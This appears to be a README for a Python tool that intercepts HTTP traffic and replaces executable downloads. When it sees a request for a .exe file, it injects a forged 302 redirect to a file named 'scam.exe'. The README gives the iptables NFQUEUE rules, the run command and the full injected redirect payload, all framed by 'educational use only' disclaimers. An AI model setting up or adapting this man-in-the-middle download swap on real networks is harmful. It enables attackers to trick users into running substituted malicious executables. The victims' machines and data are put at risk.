# 🔄 File Redirect Injector

This tool intercepts HTTP traffic and detects `.exe` file download requests. If a match is found, it injects a fake HTTP 302 redirect response, pointing the client to a custom file (`scam.exe`).

⚠️ Use this tool **only in educational or authorized environments**. Do not use it on live networks without explicit permission.

---

## 🚀 Features

* Monitors HTTP traffic over port 80
* Detects `.exe` file download requests (except `scam.exe`)
* Injects a `302 Found` HTTP response to redirect downloads
* Automatically recalculates IP and TCP checksums

---

## 🛠 Requirements

* Python 3
* Root privileges 🧑‍💻
* Required Python libraries:

  ```bash
  pip install scapy netfilterqueue
  ```

---

## 🔧 iptables Configuration

To make the script work, you need to set up an iptables rule to forward traffic to the Netfilter queue:
```bash
iptables -I FORWARD -j NFQUEUE --queue-num 1
```

For local testing:
```bash
iptables -I OUTPUT -j NFQUEUE --queue-num 1
iptables -I INPUT -j NFQUEUE --queue-num 1
```
---

## ▶️ Run the Script

```bash
sudo python3 fileRedirect.py
```

---

## 📸 How it Works

1. Detects HTTP request for a `.exe` file (e.g. `bitcoin.exe`)
2. Stores the ACK number to identify the matching response
3. On receiving the HTTP response with a matching SEQ:

   * Injects this payload:

     ```http
     HTTP/1.1 302 Found

     Location: http://127.0.0.1:80/scam.exe

     Cache-Control: no-cache, no-store, must-revalidate
     Pragma: no-cache
     Expires: 0
     Connection: close
     Content-Length: 0
     Content-Disposition: attachment; filename="replaced.exe"
     ```

---

## 🛡️ Disclaimer

🔒 This script is intended **for ethical and educational purposes only**.
📵 Unauthorized use on live networks or third-party systems may be illegal.

---

## 📜 License
Distributed under the MIT License.
